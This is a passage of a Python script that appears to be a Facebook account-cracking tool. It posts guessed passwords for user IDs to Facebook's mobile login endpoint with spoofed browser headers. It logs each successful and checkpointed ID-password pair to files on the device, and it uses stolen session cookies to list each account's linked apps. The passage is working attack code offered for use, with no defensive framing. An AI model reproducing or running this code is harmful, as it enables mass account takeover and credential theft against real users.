            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
            
                print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} │ {pw} {P}')
                cek_apk(session,coki)
                open('/sdcard/SUPRAJ-CP.txt', 'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
                open('/sdcard/SUPRAJ-OK.txt', 'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1

def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
         print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')

#-----------------------[ SYSTEM-CONTROL ]--------------------#
 
if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
menu()
